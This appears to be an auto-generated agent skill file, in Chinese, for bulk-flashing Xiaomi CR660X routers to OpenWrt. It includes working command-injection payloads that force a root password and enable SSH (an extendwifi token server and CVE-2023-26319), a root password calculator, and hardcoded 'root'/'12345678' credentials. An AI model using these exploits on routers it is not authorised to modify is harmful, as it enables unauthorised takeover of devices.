---
name: cr660x-extendwifi-ssh-enable
description: CR660X (MT7621A) 全链路刷机: extendwifi SSH → pb-boot → initramfs → OpenWrt, 含双路 SSH 编排器
source: auto-skill
extracted_at: '2026-06-16T03:16:00.000Z'
---

# CR660X 全链路刷机

## 概述

CR660X 系列（CR6606 联通/CR6608 移动/CR6609 电信，MT7621A MIPS）的完整刷机方案。

- **SSH 启用（主路）**: `extendwifi_connect` + `oneclick_get_remote_token` + HAKU 容器注入 — 通杀所有 variant，不需算密码
- **SSH 启用（备路）**: `enable_ssh_2.py` smartcontroller scene 注入（CVE-2023-26319）
- **SSH 密码**: 始终设为 `root`（token 内 `echo root >/tmp/x; passwd root </tmp/x`）
- **全自动编排器**: `all_official_2_openwrt.py` — variant 感知 + 双路 SSH + 废品判定

## 文件清单

```
cr660x/
├── all_official_2_openwrt.py       # 全自动编排器 (出厂→OpenWrt)
├── all_official_2_openwrt.ini      # 编排器配置
├── pandora_2_openwrt.py            # uboot 已启动 → POST initramfs → OpenWrt
├── initramfs_2_standard.py         # 共享: OpenWrt initramfs → sysupgrade 正式
├── enable_ssh_2.py                 # smartcontroller 备用 SSH
├── calc_cr_unicom.py               # SN+salt → SSH root 密码计算器
│
├── 3.enable_ssh.py                 # extendwifi SSH (主路)
├── 4.firmware_upload_on_miwifi.sh  # scp 上传
├── 5.uboot_write_in_miwifi.py      # mtd write pb-boot
├── 6.openwrt_write_in_miwifi.py    # sysupgrade initramfs
├── 7.firmware_upload_on_openwrt.py # scp + sysupgrade 正式
│
├── miwifi_ssh.sh                   # SSH 连接工具
└── service/cr660x_extendwifi/      # HAKU 容器注入器
    └── expolit.py
```

## SSH 启用

### 主路: extendwifi + oneclick

```bash
python3 3.enable_ssh.py --stok <stok> --extendwifi-ssid HAKU-17 [--ip <IP>]
```

流程：
1. `extendwifi_connect(ssid=HAKU-17)` → 路由器连接"伪 WiFi" → HAKU 容器返回 token
2. `oneclick_get_remote_token(username=xxx, password=xxx, nonce=xxx)` → 路由器执行 token 命令
3. TCP 探测 22 端口 (11×3s)

### 备路: smartcontroller scene

```bash
python3 enable_ssh_2.py --stok <stok> [--ip <IP>]
```

流程：
1. 热身: `set_sys_time` 写 `/tmp/ntp.status`
2. 32s 激活循环: 注入 `date -s 203301020304` 验证链路
3. 命令注入: `echo root >/tmp/x; passwd root </tmp/x; nvram set ssh_en=1; dropbear enable/restart`

### Token 命令链（关键: BusyBox ash 兼容写法）

```python
# expolit.py _send_response()
data = {
    "code": 0,
    "token": "; echo root >/tmp/x; echo root >>/tmp/x; passwd root </tmp/x;"
             " nvram set ssh_en=1; nvram commit;"
             " sed -i 's/channel=.*/channel=\"debug\"/g' /etc/init.d/dropbear;"
             " /etc/init.d/dropbear start; rm -f /tmp/x;"
}
```

**不要用** `printf` + 管道 — BusyBox ash 不处理。
**正确写法**: `echo root >/tmp/x; echo root >>/tmp/x; passwd root </tmp/x` — xmir 已验证。

## pb-boot 协议细节

### HTTP/0.9 修复历史

2026-06-15 实机坑: curl 8.15+ 默认拒绝 HTTP/0.9, `-w %{http_code}` 返 000。
**修复**: `--http0.9` + body 关键字判成功（不依赖 HTTP 状态码）。
```bash
# 正确
curl --http0.9 -X POST -F "firmware=@initramfs-kernel.bin" \
  http://192.168.1.1/upload.cgi

# 错误 (curl 8.15 以后)
curl -X POST -F "firmware=@..." http://192.168.1.1/upload.cgi
# → (1) Received HTTP/0.9 when not allowed
```

### pandora_2_openwrt.py 调用链

```bash
python3 pandora_2_openwrt.py --initramfs files/initramfs-kernel.bin \
  --sysupgrade files/sharewifi_1.0.7.bin --debug
```

终端输出示例：
```
1. POST /upload.cgi → "上传成功" / "Upload Successful"
2. GET /status.html 每 2s:
   → {status:"erasing",     progress:"30"}
   → {status:"writting",    progress:"55"}
   → {status:"done",        progress:"100"}
3. GET /reboot.cgi → 路由器重启
4. initramfs_2_standard → 等 OpenWrt → sysupgrade
```

## 全链路编排器日志诊断

常见失败模式：

| 日志 | 原因 | 修复 |
|------|------|------|
| `extendwifi_connect HTTP 502` | HAKU 容器未启动或失联 | 检查对应容器 201x 是否在跑 |
| `extendwifi_connect 失败: code=1655` | WiFi 连接被拒但 SSH 可能已开 | 通常 retry 后成功 |
| `ssh_verify Permission denied` | 密码不匹配(算出来的 vs root) | 检查 token 内是否含 passwd root |
| `ssh_verify 非 JSON:` | miwifi_ssh.sh 输出含 \r | 更新 miwifi_ssh.sh json_str 转义 \r |
| `uboot upload.cgi 空响应` | 缺 --http0.9 | 升级 pandora_2_openwrt.py |
| `initramfs_2_standard ... wait` | ping 通但 SSH 没起 | 等 60s 或检查 initramfs 是否包含 dropbear |

## 容器部署

HAKU-XX LXC 容器 (v2017-v2032) 各跑一个 `expolit.py` 实例:

| 组件 | 配置 |
|------|------|
| 容器 IP（管理，net1） | 172.16.5.{17-32}/18, gw 172.16.0.1 |
| 容器 IP（注入，net0） | 169.254.31.1/24, VLAN tagged |
| 服务端口 | 80 |
| 响应格式 | JSON `{code: 0, token: "..."}` |

## 全自动编排器

```bash
# 默认 (读 INI ssid_debug 判断环境)
python3 all_official_2_openwrt.py

# 开发: ssid_debug=true → 用 INI 配置的 extendwifi_ssid=HAKU-17
# 生产: ssid_debug=false → 用 socket.gethostname() 作为 SSID
# CLI 覆盖: --extendwifi-ssid HAKU-18
```

INI 配置示例 (`all_official_2_openwrt.ini`):
```ini
[firmware]
pb_boot_file = files/pb-boot.img
initramfs_file = files/initramfs-kernel.bin
sysupgrade_file = files/sharewifi_1.0.7.bin

[ssh]
ssid_debug = true              # true=开发(固定SSID), false=生产(容器自身hostname)
extendwifi_ssid = HAKU-17      # 开发环境用的 SSID
enable_ssh_retry = 3
ssh_wait_timeout = 90

[network]
openwrt_ip = 192.168.1.1
reboot_wait = 120
```

编排器流程:
```
扫 IP → init_info → variant 判定
├─ 联通: try 12345678 → 恢复出厂
├─ 移动/电信: 8 位密码 → 2 次机会 → 恢复出厂
login → stok → SSH (extendwifi→smartcontroller 双路 + 废品判定)
→ pb-boot → initramfs sysupgrade → initramfs_2_standard → 正式固件
```

variant 判定:
| model | variant | 密码策略 |
|-------|---------|---------|
| `cr6606`/`TR606` | unicom | 先试 12345678, 失败则恢复出厂 |
| `cr6608`/`TR608` | move | 交互 8 位贴纸密码 (字母数字!@#) |
| `cr6609`/`TR609` | move | 同上 |
| 其他 | move (兜底) | 同上 |

废品判定: SSH 双路失败 → 恢复出厂 → 重试 → 3 次仍失败 → "标记为废品需人工介入"

## uboot 阶段刷入 (pandora_2_openwrt.py)

当路由器已进 pb-boot (192.168.1.1, Copyright © 2014-2018 PandoraBox Team) 时:

```bash
python3 pandora_2_openwrt.py --initramfs files/initramfs-kernel.bin \
  --sysupgrade files/sharewifi_1.0.7.bin
```

pb-boot HTTP 协议（3 步, 与 breed 不同）:
```
1. POST /upload.cgi (HTTP/0.9)   → 上传 initramfs (需 --http0.9)
2. GET  /status.html (每 2s)     → 返回 {status:"writting",progress:"55"}
   status="done" → 继续
   status="error" → 报错
3. GET  /reboot.cgi               → 触发重启
4. wait OpenWrt → initramfs_2_standard.py → sysupgrade 正式固件
```

⚠️ **pb-boot vs breed 协议差异**:
| 阶段 | pb-boot | breed |
|------|---------|-------|
| 上传 | POST `/upload.cgi` | POST `/upload.html` (含 boot_file 空字段) |
| 触发刷写 | 上传即自动开始 | GET `/upgrading.html` (额外步骤!) |
| 进度轮询 | **GET** `/status.html` | **POST** `/upgrade_query.html` |
| 重启 | **GET** `/reboot.cgi` | GET magic + POST `/rebooting.html` |
| 协议 | **HTTP/0.9** (裸 HTML) | HTTP/1.x 标准 |
| curl 标志 | `--http0.9` 必需 | 无需特殊标志 |

## 共享模块 initramfs_2_standard.py

被 `all_official_2_openwrt.py` 和 `pandora_2_openwrt.py` 共同调用:

```bash
python3 initramfs_2_standard.py --file files/sharewifi_1.0.7.bin [--ip 192.168.1.1]
```

功能: 等 OpenWrt initramfs ping 通 → SSH 22 端口 → sysupgrade 正式固件

## HAKU 容器维护

```bash
# 上传更新 expolit.py 并重启服务
scp expolit.py root@172.16.5.17:/root/expolit.py
ssh root@172.16.5.17 "killall python3; python3 /root/expolit.py &>/dev/null &"

# 批量 (全 16 台)
for ip in $(seq 17 32); do
  sshpass -p '12345678' scp expolit.py root@172.16.5.${ip}:/root/expolit.py
  sshpass -p '12345678' ssh root@172.16.5.${ip} "killall python3; python3 /root/expolit.py &>/dev/null &"
done

# 普查验证
for ip in $(seq 17 32); do
  echo -n "172.16.5.${ip}: "
  sshpass -p '12345678' ssh root@172.16.5.${ip} "grep -c 'passwd root' /root/expolit.py; pidof python3"
done
```

## 密码计算器（联通版备用）

```bash
python3 calc_cr_unicom.py --sn "30299/C0X911327"
# SN 含 "/" → others_salt (反转 segments) → MD5[:8]
# SN 无 "/" → r1d_salt (UUID) → MD5[:8]
```

## CR6609 特性与坑

### init_info 空返回

部分 CR6609 电信版 **`/cgi-bin/luci/api/xqsystem/init_info` 返回空 body**（HTTP 200 但 body=""）。
`json.loads("")` 会抛 `Expecting value: line 1 column 1 (char 0)`。

修复方式（`2.login_get_stok.py` + 编排器）：
```python
# 不要直接解析，先 try/except
info = {}
try:
    info = http_get(url, timeout)
except Exception as e:
    log(f"init_info 不可用 ({e})，跳过")

# variant 兜底
detected_variant = detect_variant(info) if info else "move"
# device_id 为空时不影响 POST 登录（move 路径不依赖 device_id）
```

### 编排器变体交互

当 init_info 不可用时，编排器 fallback 到交互式选择：
```
  1) 联通 (CR6606 / TR606)
  2) 移动/电信 (CR6608 / CR6609 / TR608 / TR609)
  请选择 [1/2], 默认 2:
```
- 联通版：问 inited（默认 0=工厂态），密码默认 12345678
- 移动/电信版：**不问 inited，默认 1**，交互 8 位贴纸管理密码

### ssh-pwd 分配

| SSH 启用方式 | SSH root 密码 | 
|-------------|--------------|
| extendwifi+oneclick (token 内 passwd root) | **root** |
| smartcontroller scene 注入 | **root** |
| 旧版（无 passwd root 注入） | = 管理密码（联通=SN+salt 计算） |

⚠️ 2026-06-15 前 extendwifi 路径不设 root 密码 → SSH 密码 = 管理密码。
2026-06-15 修复后在 token 内注入 `echo root >/tmp/x; passwd root </tmp/x`，统一为 `root`。

### sed -u BusyBox 兼容

`4.firmware_upload_on_miwifi.sh` 内部 `sed -u` 在 BusyBox 下报错：
```
sed: unrecognized option: u
```
BusyBox sed **不支持 `-u`**（它始终行缓冲）。这是 GNU sed 的选项。
修复：去掉 `-u` 或只在 GNU sed 下使用（不影响功能，仅警告输出）。
